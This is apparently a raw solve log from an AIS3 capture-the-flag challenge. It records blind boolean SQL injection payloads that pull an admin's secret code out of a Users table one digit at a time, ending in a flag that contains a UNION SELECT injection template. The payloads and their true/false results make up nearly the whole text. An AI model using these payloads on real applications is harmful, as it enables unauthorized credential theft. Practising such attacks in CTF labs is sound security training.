' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 1, 1) < '5' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 1, 1) < '7' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 1, 1) < '9' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 1, 1) > '8' -- T
Now leak 9
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 2, 1) < '5' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 2, 1) > '3' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 2, 1) > '4' -- F
Now leak 94
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 3, 1) > '5' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 3, 1) > '3' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 3, 1) > '4' -- T
Now leak 945
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 4, 1) > '5' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 4, 1) > '7' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 4, 1) > '8' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 4, 1) < '9' -- F
9459
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 5, 1) > '5' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 5, 1) > '7' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 5, 1) > '8' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 5, 1) < '9' -- F
94599
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 6, 1) > '5' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 6, 1) > '3' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 6, 1) > '1' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 6, 1) > '2' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 6, 1) < '3' -- F
945993
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 7, 1) < '5' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 7, 1) > '7' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 7, 1) > '8' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 7, 1) < '9' -- F
9459939
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 8, 1) < '5' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 8, 1) > '7' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 8, 1) > '6' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 8, 1) < '6' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 8, 1) > '5' -- F
94599395
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 9, 1) < '5' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 9, 1) < '3' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 9, 1) > '3' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 9, 1) < '4' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 9, 1) > '4' -- F
945993954
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 10, 1) < '5' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 10, 1) < '7' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 10, 1) > '8' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 10, 1) < '8' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 10, 1) > '7' -- F
9459939547
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 11, 1) < '5' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 11, 1) < '3' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 11, 1) < '1' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 11, 1) > '1' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 11, 1) < '2' -- T
94599395471
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 12, 1) < '5' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 12, 1) < '7' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 12, 1) > '5' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 12, 1) < '6' -- T
945993954715
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 13, 1) < '5' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 13, 1) < '7' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 13, 1) > '5' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 13, 1) < '6' -- T
9459939547155
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 14, 1) < '5' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 14, 1) < '3' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 14, 1) < '1' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 14, 1) > '1' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 14, 1) < '2' -- T
94599395471551
AIS3{' UNION SELECT 1, 1, 1, 1 WHERE ({condition})--}